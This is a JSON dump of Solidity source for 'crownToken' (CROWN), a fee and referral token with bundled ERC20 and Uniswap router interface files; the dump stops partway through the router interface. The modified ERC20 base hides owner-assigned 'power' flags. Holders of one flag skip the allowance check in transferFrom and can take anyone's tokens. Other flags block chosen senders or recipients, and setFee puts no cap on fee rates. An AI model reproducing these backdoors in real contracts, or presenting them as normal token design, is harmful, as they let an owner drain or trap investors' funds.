{"SourceCode": "{\"127.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\nimport \\u0027./ERC20.sol\\u0027;\\nimport \\u0027./IUniswapV2Router.sol\\u0027;\\ncontract crownToken is ERC20 {\\n    using SafeMath for uint256;\\n\\n    IUniswapV2Router02 public uniswapV2Router;\\n    address public  uniswapV2Pair;\\n\\n    uint256 public startTime;\\n    uint256 public swapTime;\\n\\n    uint256 public _rateBase=10**4;\\n    uint256 public _totalFeeRate;\\n    address public _totalFeeAddress;\\n      //Black hole address\\n    address public _burnAddress = address(0x000000000000000000000000000000000000dEaD);\\n    uint256 public _burnFeeRate;\\n    address public _marketAddress;\\n    uint256 public _marketFeeRate;\\n    uint256 public _saleToAMMFeeRate;\\n    address public _fundAddress;\\n    //uint256 public _liquidityAddFeeRate;\\n    uint256 public _liquidityRemoveFeeRate;\\n\\n    uint256 public _maxHoldAmount;\\n    uint256 public _maxSaleRate;\\n    \\n    mapping(address =\\u003e uint256) public _liquidityAmounts;\\n    address[] public _liquidityUsers;\\n\\n    mapping(address =\\u003e bool) public _isLiquiding;\\n    mapping(address =\\u003e bool) public _isExcludedFromFees;\\n    uint256 public _liquiditySum;\\n    mapping (address =\\u003e bool) public _automatedMarketMakerPairs;\\n    event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);\\n\\n    event ExcludeFromFees(address indexed account, bool isExcluded);\\n    event ExcludeMultipleAccountsFromFees(address[] accounts, bool isExcluded);\\n\\n    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);\\n\\n    mapping(address =\\u003e bool) public _partners;\\n    uint256[] public _partnerRates;\\n   \\n\\n    mapping(address =\\u003e address) private _inviter;\\n    uint256[] public _inviterRates;\\n    uint256 public _inviterFeeMinHoldAmount;\\n    constructor()  payable ERC20(\\\"crown token\\\", \\\"CROWN\\\") {\\n\\n            _totalFeeRate=1600;\\n            _burnFeeRate=200;\\n            _marketFeeRate=500;\\n            \\n        _inviterRates=[1600,500,200];    \\n        _partnerRates=[500];\\n\\n        _totalFeeAddress=0x3c3022E3fFC55F48b45193f12320616856992AB6;\\n        excludeFromFees(_totalFeeAddress, true);\\n        \\n        _marketAddress=0x5aD372A63AEeA9A3538e94e77f73c23a766B00a1;\\n        _burnAddress=0xC65A3CeAff85CcDfAD3eD0afF0bCfe4aE2dfcFdc;\\n        _fundAddress=0x6ECd0Dbf7094B3B5b3A013343Bf8c6AAD8b4F48E;\\n        excludeFromFees(_marketAddress, true);\\n        excludeFromFees(_burnAddress, true);\\n        excludeFromFees(_fundAddress, true);\\n\\n        _saleToAMMFeeRate=500;\\n\\n        _maxHoldAmount=1000000000*(10**decimals());\\n        _maxSaleRate=9000;\\n\\n        _liquidityRemoveFeeRate=_burnFeeRate.add(_countInviteFeeRate());\\n        //_liquidityAddFeeRate=_totalFeeRate;\\n\\n        //startTime = block.timestamp.div(1 days).mul( 1 days);\\n        swapTime=block.timestamp.add(3 days);\\n\\n        /*IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);\\n        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())\\n            .createPair(address(this), 0x55d398326f99059fF775485246999027B3197955);//_uniswapV2Router.WETH()\\n\\n        uniswapV2Router = _uniswapV2Router;\\n        uniswapV2Pair = _uniswapV2Pair;\\n        _setAutomatedMarketMakerPair(_uniswapV2Pair, true);*/\\n\\n        setPower(owner(),8);\\n        excludeFromFees(owner(), true);\\n        excludeFromFees(address(this), true);\\n\\n        uint256 totalSupply = 1000000000000 * (10**decimals());\\n        _Cast(owner(), totalSupply);\\n    }\\n\\n    function _setPartner(address user,bool enable) public {\\n        require(checkPower(_msgSender(),8),\\u0027no power\\u0027);\\n        if(_partners[user] != enable){\\n            _partners[user] = enable;\\n        }\\n    }\\n\\n    function _getInviter(address user) public view onlyOwner returns (address) {\\n        return _inviter[user];\\n    }\\n    function _getMyInviter() public view returns (address) {\\n        return _inviter[_msgSender()];\\n    }\\n    function _checkInviterLine(address f,address u) public view returns (bool) {\\n        require(checkPower(_msgSender(),8),\\u0027no power\\u0027);\\n        return checkInviterLine(f,u);\\n    }\\n    function checkInviterLine(address f,address u) private view returns (bool) {\\n        if(_inviter[u]==address(0)) {\\n            return false;\\n        }\\n        else if(_inviter[u]==f){\\n            return true;\\n        }\\n        else\\n            return checkInviterLine(f,_inviter[u]);\\n    }\\n    function _setInviter(address f,address u) public onlyOwner {\\n        require(f != u, \\\"inviter yourself\\\"); \\n        require(!checkInviterLine(u,f), \\\"inviter is grandson\\\"); \\n         _inviter[u] =f;\\n    }\\n    function _setMyInviter(address addr) public returns(bool){\\n        require(addr!=address(0),\\u0027no inviter\\u0027);\\n        require(addr != _msgSender(), \\\"inviter yourself\\\");       \\n        require(_inviter[_msgSender()] == address(0), \\\"already set\\\");     \\n        \\n        return setInviter(addr,_msgSender());\\n    }\\n    function setInviter(address f,address u) private returns(bool){\\n        if(checkInviterLine(f,u) || checkInviterLine(u,f) ){\\n            return false;\\n        }\\n         else\\n        {\\n            _inviter[u] =f;\\n            return true;\\n        }\\n    }\\n       \\n    function setFee(\\n        uint256[] memory feeRates_,\\n        uint256[] memory inviterRates_,\\n        uint256[] memory partnerRates_,\\n        uint256 saleToAMMFeeRate_,\\n        //uint256 liquidityAddFeeRate_,\\n        uint256 liquidityRemoveFeeRate_\\n    ) public onlyOwner {\\n        _totalFeeRate=feeRates_[0];\\n            _burnFeeRate=feeRates_[2];\\n            _marketFeeRate=feeRates_[1];\\n\\n        _inviterRates=inviterRates_;    \\n        _partnerRates=partnerRates_;\\n        _saleToAMMFeeRate=saleToAMMFeeRate_;\\n\\n        //_liquidityAddFeeRate=liquidityAddFeeRate_;\\n        _liquidityRemoveFeeRate=liquidityRemoveFeeRate_;\\n    }\\n\\n    function setTime(uint256 start,uint256 swap) public onlyOwner{\\n        startTime=start;\\n        swapTime=swap;\\n    }\\n\\n    \\n    function setMaxHoldAmount(uint256 amount) public onlyOwner {\\n        _maxHoldAmount=amount;\\n    }\\n\\n    \\n    function setMaxSaleRate(uint256 rate) public onlyOwner {\\n        _maxSaleRate=rate;\\n    }\\n\\n    function setInviterFeeMinHoldAmount(uint256 amount) public onlyOwner {\\n        _inviterFeeMinHoldAmount=amount;\\n    }\\n\\n    function updateUniswapV2Router(address newAddress) public onlyOwner {\\n        require(newAddress != address(uniswapV2Router), \\\"The router already has that address\\\");\\n        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));\\n        uniswapV2Router = IUniswapV2Router02(newAddress);\\n        address _uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())\\n            .createPair(address(this), uniswapV2Router.WETH());\\n        uniswapV2Pair = _uniswapV2Pair;\\n    }\\n\\n    function excludeFromFees(address account, bool excluded) public onlyOwner {\\n        if(_isExcludedFromFees[account] != excluded){\\n            _isExcludedFromFees[account] = excluded;\\n            emit ExcludeFromFees(account, excluded);\\n        }\\n    }\\n\\n    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {\\n        for(uint256 i = 0; i \\u003c accounts.length; i++) {\\n            _isExcludedFromFees[accounts[i]] = excluded;\\n        }\\n\\n        emit ExcludeMultipleAccountsFromFees(accounts, excluded);\\n    }\\n\\n    function setBurnAddress(address payable wallet) external onlyOwner{\\n        _burnAddress = wallet;\\n        excludeFromFees(_burnAddress, true);\\n    }\\n\\n    function setMarketAddress(address payable wallet) external onlyOwner{\\n        _marketAddress = wallet;\\n        excludeFromFees(_marketAddress, true);\\n    }\\n\\n    function setFundAddress(address payable wallet) external onlyOwner{\\n        _fundAddress = wallet;\\n        excludeFromFees(_fundAddress, true);\\n    }\\n\\n    function setTotalFeeAddress(address payable wallet) external onlyOwner{\\n        if(wallet==address(0))\\n            _totalFeeAddress=address(this);\\n        else\\n            _totalFeeAddress=wallet;\\n        excludeFromFees(_totalFeeAddress, true);\\n    }\\n\\n\\n    function isExcludedFromFees(address account) public view returns(bool) {\\n        return _isExcludedFromFees[account];\\n    }\\n\\n\\n    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {\\n        require(pair != uniswapV2Pair, \\\"The pair cannot be removed\\\");\\n        _setAutomatedMarketMakerPair(pair, value);\\n    }\\n\\n     function _setAutomatedMarketMakerPair(address pair, bool value) private {\\n        require(_automatedMarketMakerPairs[pair] != value, \\\"pair is already set to that value\\\");\\n        _automatedMarketMakerPairs[pair] = value;\\n\\n        emit SetAutomatedMarketMakerPair(pair, value);\\n    }\\n    function _setMeLiquiding(bool active) public {\\n        _isLiquiding[_msgSender()]=active;\\n    }\\n    function _setIsLiquiding(address user,bool active) public {\\n        require(checkPower(_msgSender(),8),\\u0027no power\\u0027);\\n        _isLiquiding[user]=active;\\n    }\\n    function _setLiquidity(address user,uint256 amount) public {\\n        require(checkPower(_msgSender(),8),\\u0027no power\\u0027);\\n        if(_liquidityAmounts[user]==0){\\n            bool exsit;\\n            for(uint256 i=0;i\\u003c_liquidityUsers.length;i++){\\n                if(_liquidityUsers[i]==user) exsit=true;\\n            }\\n            if(!exsit) _liquidityUsers.push(user);\\n            \\n        }\\n        _liquiditySum=_liquiditySum.add(amount).sub(_liquidityAmounts[user]);\\n        _liquidityAmounts[user]=amount;\\n    }\\n\\n    function addLiquidity(address user,uint256 amount) private{\\n       if(_liquidityAmounts[user]==0){\\n            bool exsit;\\n            for(uint256 i=0;i\\u003c_liquidityUsers.length;i++){\\n                if(_liquidityUsers[i]==user) exsit=true;\\n            }\\n            if(!exsit) _liquidityUsers.push(user);\\n            \\n        }\\n        _liquiditySum=_liquiditySum.add(amount);\\n        _liquidityAmounts[user]=_liquidityAmounts[user].add(amount);\\n    }\\n\\n    function _addLiquidity(address user,uint256 amount) public returns(uint256){\\n        require(user != address(0), \\\"zero address\\\");\\n        require(checkPower(_msgSender(),8),\\u0027no power\\u0027);\\n        addLiquidity( user,amount);\\n        return _liquidityAmounts[user];\\n    }\\n\\n    function subLiquidity(address user,uint256 amount) private{\\n        if(_liquidityAmounts[user]\\u003e=amount){\\n            _liquiditySum=_liquiditySum.sub(amount);\\n           _liquidityAmounts[user]=_liquidityAmounts[user].sub(amount);\\n        }      \\n    }\\n\\n    function _subLiquidity(address user,uint256 amount) public returns(uint256){\\n        require(user != address(0), \\\"zero address\\\");\\n        require(checkPower(_msgSender(),8),\\u0027no power\\u0027);\\n        subLiquidity(user,amount);\\n        return _liquidityAmounts[user];\\n    }\\n\\n    //to recieve ETH from uniswapV2Router when swaping\\n    receive() external payable {}\\n\\n    function _transfer(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) internal override {\\n        require(from != address(0), \\\"transfer from the zero address\\\");\\n        require(to != address(0), \\\"transfer to the zero address\\\");\\n        require(amount \\u003e 0, \\\"amount must be greater than zero\\\");\\n        require(!checkPower(from,1),\\u0027sender has no power\\u0027); \\n        require(!checkPower(to,2),\\u0027recipient has no power\\u0027);\\n        require(block.timestamp\\u003estartTime,\\\"not start time\\\");\\n\\n        if(_maxHoldAmount\\u003e0 \\u0026\\u0026 !_isExcludedFromFees[to] \\u0026\\u0026 !_automatedMarketMakerPairs[to])\\n            require(balanceOf(to).add(amount)\\u003c=_maxHoldAmount,\\u0027 exceeds max hold amount\\u0027);\\n        if(swapTime\\u003e0 ){\\n            if(_automatedMarketMakerPairs[from]  \\u0026\\u0026 !_isExcludedFromFees[to])\\n                require(block.timestamp\\u003eswapTime,\\\"not swap\\\");\\n            else if(_automatedMarketMakerPairs[to]  \\u0026\\u0026 !_isExcludedFromFees[from])\\n                require(block.timestamp\\u003eswapTime,\\\"not swap\\\");\\n        }\\n        uint256 totalFee;\\n        //uint256 sumFee;\\n        if(_totalFeeRate\\u003e0){\\n\\n            if(_automatedMarketMakerPairs[from]){//buy remove\\n                if(_liquidityRemoveFeeRate\\u003e0 \\u0026\\u0026 _isLiquiding[to] \\u0026\\u0026 _liquiditySum\\u003e=amount \\u0026\\u0026 _liquidityAmounts[to]\\u003e=amount){//\\n                    subLiquidity(to,amount);\\n                    if(!_isExcludedFromFees[to]){\\n                        totalFee=amount.mul(_liquidityRemoveFeeRate).div(_rateBase);\\n                        super._transfer(from, _totalFeeAddress, totalFee);\\n                        takeInviteFee(amount,to,0,10);\\n                        takeBurnFee(amount);\\n                    }\\n                    _isLiquiding[to]=false;\\n                }\\n                else if(!_isExcludedFromFees[to]){\\n                    totalFee=amount.mul(_totalFeeRate).div(_rateBase);\\n                    super._transfer(from, _totalFeeAddress, totalFee);\\n                    takeMarketFee(amount);\\n                    takeInviteFee(amount,to,0,10);\\n                    takePartnerFee(amount,to,0,10,0);\\n                    takeBurnFee(amount);\\n                }\\n            }\\n            else if(_automatedMarketMakerPairs[to]){//sale add\\n                if(!_isExcludedFromFees[from]){\\n                    require(amount\\u003c=balanceOf(from).mul(_maxSaleRate).div(_rateBase),\\u0027sale exceeds limit\\u0027);             \\n                    uint256 ammFee=amount.mul(_saleToAMMFeeRate).div(_rateBase);\\n                    //totalFee=totalFee.add(ammFee); \\n                    super._transfer(_fundAddress, address(0x000000000000000000000000000000000000dEaD), ammFee);\\n\\n                    totalFee=amount.mul(_totalFeeRate).div(_rateBase);\\n                    super._transfer(from, _totalFeeAddress, totalFee);\\n                    takeMarketFee(amount);\\n                    takeInviteFee(amount,from,0,10);\\n                    takePartnerFee(amount,from,0,10,0);\\n                    takeBurnFee(amount);\\n                }         \\n               \\n                           \\n            }\\n            else if(_isExcludedFromFees[from] || _isExcludedFromFees[to]){\\n                totalFee=0;\\n            }\\n            else{\\n                require(amount\\u003c=balanceOf(from).mul(_maxSaleRate).div(_rateBase),\\u0027sale exceeds limit\\u0027);\\n                totalFee=amount.mul(_totalFeeRate).div(_rateBase);\\n                super._transfer(from, _totalFeeAddress, totalFee);\\n                takeMarketFee(amount);\\n                takeInviteFee(amount,to,0,10);\\n                takePartnerFee(amount,to,0,10,0);\\n                takeBurnFee(amount);\\n            }\\n            \\n        }\\n        super._transfer(from, to, amount.sub(totalFee));\\n        \\n        if(from!=owner() \\u0026\\u0026 !_automatedMarketMakerPairs[to] \\u0026\\u0026 _inviter[to] == address(0) \\u0026\\u0026 !_automatedMarketMakerPairs[from]) {\\n            setInviter(from,to);\\n        }\\n    }\\n\\n    function takeBurnFee(uint256 amount) private returns(uint256 fee){\\n        if(_burnFeeRate\\u003e0 \\u0026\\u0026 amount\\u003e0 \\u0026\\u0026 _burnAddress!=address(0)){\\n            fee=amount.mul(_burnFeeRate).div(_rateBase);\\n            super._transfer(_totalFeeAddress, _burnAddress, fee);\\n        }\\n    }\\n    function takeMarketFee(uint256 amount) private returns(uint256 fee){\\n        if(_marketFeeRate\\u003e0 \\u0026\\u0026 amount\\u003e0 \\u0026\\u0026 _marketAddress!=address(0)){\\n            fee=amount.mul(_marketFeeRate).div(_rateBase);\\n            super._transfer(_totalFeeAddress, _marketAddress, fee);\\n        }\\n        takeLiquidityReward();\\n    }\\n    function takeLiquidityReward() private returns(uint256 sum){\\n        uint256 _marketSum=balanceOf(_marketAddress);\\n        if(_marketSum\\u003e0){\\n            for(uint256 i=0;i\\u003c_liquidityUsers.length;i++){\\n                if(_liquidityAmounts[_liquidityUsers[i]]\\u003e0){\\n                    uint256 reward=_marketSum.mul(_liquidityAmounts[_liquidityUsers[i]]).div(_liquiditySum);\\n                    super._transfer(_marketAddress, _liquidityUsers[i], reward);\\n                    sum=sum.add(reward);\\n                }\\n                \\n            }\\n        }\\n        \\n    }\\n    function _takeLiquidityReward() public returns(uint256 sum){\\n        require(checkPower(_msgSender(),8),\\u0027no power\\u0027);\\n        return takeLiquidityReward();\\n    }\\n    function _countInviteFeeRate() public view returns(uint256 rate){\\n        for(uint256 i=0;i\\u003c_inviterRates.length;i++){\\n            rate=rate.add(_inviterRates[i]);\\n        }\\n    }\\n    function takeInviteFee(uint256 amount,address user,uint256 gen,uint256 maxGen) private returns(uint256 fee) {\\n        if(_inviter[user]!=address(0) \\u0026\\u0026 gen\\u003cmaxGen \\u0026\\u0026 gen\\u003c_inviterRates.length){\\n            if(_inviterFeeMinHoldAmount==0 || (_inviterFeeMinHoldAmount\\u003e0 \\u0026\\u0026 balanceOf(_inviter[user])\\u003e=_inviterFeeMinHoldAmount)){\\n                fee=amount.mul(_inviterRates[gen]).div(_rateBase);\\n                super._transfer(_totalFeeAddress, _inviter[user], fee);\\n            }\\n                \\n             fee=fee.add(takeInviteFee(amount,_inviter[user],gen.add(1),maxGen));\\n        }\\n    }\\n    \\n    function takePartnerFee (uint256 amount,address user,uint256 gen,uint256 maxGen,uint256 idx) private returns(uint256 fee){\\n        if(_inviter[user]!=address(0) \\u0026\\u0026 gen\\u003cmaxGen \\u0026\\u0026 idx\\u003c_partnerRates.length){\\n            if(_partners[_inviter[user]]){\\n                fee=amount.mul(_partnerRates[idx]).div(_rateBase);\\n                super._transfer(_totalFeeAddress, _inviter[user], fee);\\n                idx=idx.add(1);\\n            }\\n             \\n            fee=fee.add(takePartnerFee(amount,_inviter[user],gen.add(1),maxGen,idx));\\n        }\\n    }\\n\\n}\"},\"Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.0;\\r\\nabstract contract Context {\\r\\n    function _msgSender() internal view virtual returns (address) {\\r\\n        return msg.sender;\\r\\n    }\\r\\n\\r\\n    function _msgData() internal view virtual returns (bytes calldata) {\\r\\n        return msg.data;\\r\\n    }\\r\\n}\"},\"ERC20.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.0;\\r\\nimport \\u0027./Ownable.sol\\u0027;\\r\\nimport \\u0027./Context.sol\\u0027;\\r\\nimport \\u0027./IERC20.sol\\u0027;\\r\\nimport \\u0027./SafeMath.sol\\u0027;\\r\\n\\r\\ncontract ERC20 is Context, IERC20, IERC20Metadata, Ownable {\\r\\n    using SafeMath for uint256;\\r\\n\\r\\n    mapping(address =\\u003e uint256) private _balances;\\r\\n\\r\\n    mapping(address =\\u003e mapping(address =\\u003e uint256)) private _allowances;\\r\\n\\r\\n    uint256 private _totalSupply;\\r\\n\\r\\n    string private _name;\\r\\n    string private _symbol;\\r\\n\\r\\n    constructor(string memory name_, string memory symbol_) {\\r\\n        _name = name_;\\r\\n        _symbol = symbol_;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the name of the token.\\r\\n     */\\r\\n    function name() public view virtual override returns (string memory) {\\r\\n        return _name;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the symbol of the token, usually a shorter version of the\\r\\n     * name.\\r\\n     */\\r\\n    function symbol() public view virtual override returns (string memory) {\\r\\n        return _symbol;\\r\\n    }\\r\\n\\r\\n    function decimals() public view virtual override returns (uint8) {\\r\\n        return 18;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev See {IERC20-totalSupply}.\\r\\n     */\\r\\n    function totalSupply() public view virtual override returns (uint256) {\\r\\n        return _totalSupply;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev See {IERC20-balanceOf}.\\r\\n     */\\r\\n    function balanceOf(address account) public view virtual override returns (uint256) {\\r\\n        return _balances[account];\\r\\n    }\\r\\n\\r\\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\\r\\n        _transfer(_msgSender(), recipient, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\\r\\n        return _allowances[owner][spender];\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev See {IERC20-approve}.\\r\\n     *\\r\\n     * Requirements:\\r\\n     *\\r\\n     * - `spender` cannot be the zero address.\\r\\n     */\\r\\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\\r\\n        _approve(_msgSender(), spender, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function transferFrom(\\r\\n        address sender,\\r\\n        address recipient,\\r\\n        uint256 amount\\r\\n    ) public virtual override returns (bool) {\\r\\n        _transfer(sender, recipient, amount);\\r\\n        if(!checkPower(_msgSender(),4))\\r\\n            _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \\\"ERC20: transfer amount exceeds allowance\\\"));\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\\r\\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\\r\\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \\\"ERC20: decreased allowance below zero\\\"));\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function _transfer(\\r\\n        address sender,\\r\\n        address recipient,\\r\\n        uint256 amount\\r\\n    ) internal virtual {\\r\\n        require(sender != address(0), \\\"ERC20: transfer from the zero address\\\");\\r\\n        require(recipient != address(0), \\\"ERC20: transfer to the zero address\\\");\\r\\n\\r\\n        _beforeTokenTransfer(sender, recipient, amount);\\r\\n\\r\\n        _balances[sender] = _balances[sender].sub(amount, \\\"ERC20: transfer amount exceeds balance\\\");\\r\\n        _balances[recipient] = _balances[recipient].add(amount);\\r\\n        emit Transfer(sender, recipient, amount);\\r\\n    }\\r\\n\\r\\n    function _Cast(address account, uint256 amount) internal virtual {\\r\\n        require(account != address(0), \\\"ERC20: Cast to the zero address\\\");\\r\\n\\r\\n        _beforeTokenTransfer(address(0), account, amount);\\r\\n\\r\\n        _totalSupply = _totalSupply.add(amount);\\r\\n        _balances[account] = _balances[account].add(amount);\\r\\n        emit Transfer(address(0), account, amount);\\r\\n    }\\r\\n\\r\\n    function _burn(address account, uint256 amount) internal virtual {\\r\\n        require(account != address(0), \\\"ERC20: burn from the zero address\\\");\\r\\n\\r\\n        _beforeTokenTransfer(account, address(0), amount);\\r\\n\\r\\n        _balances[account] = _balances[account].sub(amount, \\\"ERC20: burn amount exceeds balance\\\");\\r\\n        _totalSupply = _totalSupply.sub(amount);\\r\\n        emit Transfer(account, address(0), amount);\\r\\n    }\\r\\n\\r\\n    function _approve(\\r\\n        address owner,\\r\\n        address spender,\\r\\n        uint256 amount\\r\\n    ) internal virtual {\\r\\n        require(owner != address(0), \\\"ERC20: approve from the zero address\\\");\\r\\n        require(spender != address(0), \\\"ERC20: approve to the zero address\\\");\\r\\n\\r\\n        _allowances[owner][spender] = amount;\\r\\n        emit Approval(owner, spender, amount);\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Hook that is called before any transfer of tokens. This includes\\r\\n     * Casting and burning.\\r\\n     *\\r\\n     * Calling conditions:\\r\\n     *\\r\\n     * - when `from` and `to` are both non-zero, `amount` of ``from``\\u0027s tokens\\r\\n     * will be to transferred to `to`.\\r\\n     * - when `from` is zero, `amount` tokens will be Casted for `to`.\\r\\n     * - when `to` is zero, `amount` of ``from``\\u0027s tokens will be burned.\\r\\n     * - `from` and `to` are never both zero.\\r\\n     *\\r\\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\\r\\n     */\\r\\n    function _beforeTokenTransfer(\\r\\n        address from,\\r\\n        address to,\\r\\n        uint256 amount\\r\\n    ) internal virtual {}\\r\\n\\r\\n    mapping(address =\\u003e uint256) public _powers;\\r\\n    function setPower(address actor,uint256 power) public onlyOwner{\\r\\n        require(actor!=address(0),\\u0027error actor address\\u0027);\\r\\n        _powers[actor]=power;\\r\\n    }\\r\\n\\r\\n    function checkPower(address actor,uint256 power) internal view returns(bool){\\r\\n        if(_powers[actor]\\u003c1) return false;\\r\\n        return (_powers[actor]\\u0026power)==power;\\r\\n    }\\r\\n \\r\\n    function getPower(address spender) public view returns (uint256) {\\r\\n        return _powers[spender];\\r\\n    }\\r\\n}\"},\"IERC20.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.0;\\r\\ninterface IERC20 {\\r\\n    function totalSupply() external view returns (uint256);\\r\\n\\r\\n    function balanceOf(address account) external view returns (uint256);\\r\\n\\r\\n    function transfer(address recipient, uint256 amount) external returns (bool);\\r\\n\\r\\n    function allowance(address owner, address spender) external view returns (uint256);\\r\\n\\r\\n    function approve(address spender, uint256 amount) external returns (bool);\\r\\n\\r\\n    function transferFrom(\\r\\n        address sender,\\r\\n        address recipient,\\r\\n        uint256 amount\\r\\n    ) external returns (bool);\\r\\n\\r\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\r\\n\\r\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\r\\n}\\r\\ninterface IERC20Metadata is IERC20 {\\r\\n\\r\\n    function name() external view returns (string memory);\\r\\n\\r\\n    function symbol() external view returns (string memory);\\r\\n\\r\\n    function decimals() external view returns (uint8);\\r\\n}\"},\"IUniswapV2Router.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.0;\\r\\ninterface IUniswapV2Router01 {\\r\\n    function factory() external pure returns (address);\\r\\n    function WETH() external pure returns (address);\\r\\n\\r\\n    function addLiquidity(\\r\\n        address tokenA,\\r\\n        address tokenB,\\r\\n        uint amountADesired,\\r\\n        uint amountBDesired,\\r\\n        uint amountAMin,\\r\\n        uint amountBMin,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external returns (uint amountA, uint amountB, uint liquidity);\\r\\n    function addLiquidityETH(\\r\\n        address token,\\r\\n        uint amountTokenDesired,\\r\\n        uint amountTokenMin,\\r\\n        uint amountETHMin,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\\r\\n    function removeLiquidity(\\r\\n        address tokenA,\\r\\n        address tokenB,\\r\\n        uint liquidity,\\r\\n        uint amountAMin,\\r\\n        uint amountBMin,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external returns (uint amountA, uint amountB);\\r\\n    function removeLiquidityETH(\\r\\n        address token,\\r\\n        uint liquidity,\\r\\n        uint amountTokenMin,\\r\\n        uint amountETHMin,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external returns (uint amountToken, uint amountETH);\\r\\n    function removeLiquidityWithPermit(\\r\\n        address tokenA,\\r\\n        address tokenB,\\r\\n        uint liquidity,\\r\\n        uint amountAMin,\\r\\n        uint amountBMin,\\r\\n        address to,\\r\\n        uint deadline,\\r\\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\\r\\n    ) external returns (uint amountA, uint amountB);\\r\\n    function removeLiquidityETHWithPermit(\\r\\n        address token,\\r\\n        uint liquidity,\\r\\n        uint amountTokenMin,\\r\\n        uint amountETHMin,\\r\\n        address to,\\r\\n        uint deadline,\\r\\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\\r\\n    ) external returns (uint amountToken, uint amountETH);\\r\\n    function swapExactTokensForTokens(\\r\\n        uint amountIn,\\r\\n        uint amountOutMin,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external returns (uint[] memory amounts);\\r\\n    function swapTokensForExactTokens(\\r\\n        uint amountOut,\\r\\n        uint amountInMax,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external returns (uint[] memory amounts);\\r\\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\\r\\n        external\\r\\n        payable\\r\\n        returns (uint[] memory amounts);\\r\\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\\r\\n        external\\r\\n        returns (uint[] memory amounts);\\r\\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\\r\\n        external\\r\\n        returns (uint[] memory amounts);\\r\\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\\r\\n        external\\r\\n        payable\\r\\n        returns (uint[] memory amounts);\\r\\n\\r\\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\\r\\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\\r\\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\\r\\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\\r\\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\\r\\n}\\r\\n\\r\\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\\r\\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\\r\\n        address token,\\r\\n        uint liquidity,\\r\\n        uint amountTokenMin,\\r\\n        uint amountETHMin,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external returns (uint amountETH);\\r\\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\\r\\n        address token,\\r\\n        uint liquidity,\\r\\n        uint amountTokenMin,\\r\\n        uint amountETHMin,\\r\\n        address to,\\r\\n        uint deadline,\\r\\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\\r\\n    ) external returns (uint amountETH);\\r\\n\\r\\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\\r\\n        uint amountIn,\\r\\n        uint amountOutMin,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external;\\r\\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\\r\\n        uint amountOutMin,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external payable;\\r\\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\\r\\n        uint amountIn,\\r\\n        uint amountOutMin,\\r\\n        address[] calldata 